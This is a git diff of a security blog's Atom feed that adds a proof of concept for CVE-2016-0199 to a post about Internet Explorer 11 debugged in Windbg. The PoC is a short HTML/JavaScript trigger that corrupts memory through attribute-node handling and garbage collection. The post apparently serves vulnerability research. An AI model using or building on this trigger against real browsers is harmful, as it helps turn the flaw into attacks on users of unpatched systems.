@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2018-05-15T15:06:50-05:00</updated>
+  <updated>2018-05-15T15:15:31-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -14,7 +14,7 @@
 
   
   <entry>
-    <title type="html"><![CDATA[cve_2016_0199]]></title>
+    <title type="html"><![CDATA[CVE-2016-0199]]></title>
     <link href="http://wg135.github.io/blog/2018/05/15/cve-2016-0199/"/>
     <updated>2018-05-15T15:02:16-05:00</updated>
     <id>http://wg135.github.io/blog/2018/05/15/cve-2016-0199</id>
@@ -25,6 +25,34 @@
 <li>IE 11</li>
 <li>Windbg</li>
 </ul>
+
+
+<!--more-->
+
+
+<p>POC:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;X-UA-Compatible&quot;</span> <span class="na">content=</span><span class="s">&quot;IE=7&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'><span class="nt">&lt;script&gt;</span>
+</span><span class='line'><span class="nx">oElement</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;IMG&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">oAttr</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createAttribute</span><span class="p">(</span><span class="s2">&quot;loop&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nx">oAttr</span><span class="p">.</span><span class="nx">nodeValue</span> <span class="o">=</span> <span class="nx">oElement</span><span class="p">;</span>
+</span><span class='line'><span class="nx">oElement</span><span class="p">.</span><span class="nx">loop</span> <span class="o">=</span> <span class="mh">0x41424344</span><span class="p">;</span>
+</span><span class='line'><span class="nx">oElement</span><span class="p">.</span><span class="nx">setAttributeNode</span><span class="p">(</span><span class="nx">oAttr</span><span class="p">);</span>
+</span><span class='line'><span class="nx">oElement</span><span class="p">.</span><span class="nx">removeAttributeNode</span><span class="p">(</span><span class="nx">oAttr</span><span class="p">);</span>
+</span><span class='line'><span class="nx">CollectGarbage</span><span class="p">();</span>
+</span><span class='line'><span class="nt">&lt;/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
 
 ]]></content>
   </entry>
